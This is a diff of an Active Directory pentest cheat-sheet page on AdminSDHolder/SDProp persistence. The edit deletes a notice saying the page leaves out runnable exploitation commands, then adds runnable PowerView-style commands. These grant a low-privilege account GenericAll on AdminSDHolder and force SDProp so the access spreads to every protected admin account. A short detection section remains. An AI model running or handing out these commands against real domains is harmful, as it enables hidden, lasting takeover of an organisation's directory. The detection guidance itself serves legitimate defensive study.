@@ -10,24 +10,40 @@ mitre: "T1098"
 tag: null
 ---
 
+
 # AdminSDHolder / SDProp persistence
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Affected object / attribute
+### Affected object / attribute
 **`CN=AdminSDHolder,CN=System,DC=...`** — `nTSecurityDescriptor`.
 
-## Impact
+### Concept (deep)
+**SDProp** (every 60 minutes) copies the AdminSDHolder ACL to all **protected accounts and groups** (`adminCount=1`). Adding an ACE here is **quiet, durable persistence** across DA resets.
+
+### Attack flow (Mermaid)
+```mermaid
+flowchart TD
+    A[Write ACE on AdminSDHolder] --> B[SDProp runs every 60 min]
+    B --> C[ACE propagates to Domain Admins / EA / protected groups]
+    C --> D[Persistent domain-wide privilege]
+```
+
+### Commands
+```bash
+# ── Add GenericAll for lowpriv ───────────────────────────────────────
+Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
+  -PrincipalSamAccountName lowpriv -Rights All
+
+# ── Force SDProp (optional) ──────────────────────────────────────────
+Invoke-SDPropagator -timeoutMinutes 1
+
+# ── Read the ACL (audit) ─────────────────────────────────────────────
+impacket-dacledit -action read -target-dn 'CN=AdminSDHolder,CN=System,DC=corp,DC=local'
+```
+
+### Impact
 **Persistent domain-wide privilege** on every protected account.
 
-## Detection and defensive measures
+### Detection and defensive measures
 **5136** on `CN=AdminSDHolder`; compare `adminCount=1` objects’ ACLs against baseline; alert on SDProp ACL drift.
 
 ---
-
-## References
-
-- [Microsoft: Protected accounts and groups in Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
-- [MITRE ATT&CK: Account Manipulation](https://attack.mitre.org/techniques/T1098/)
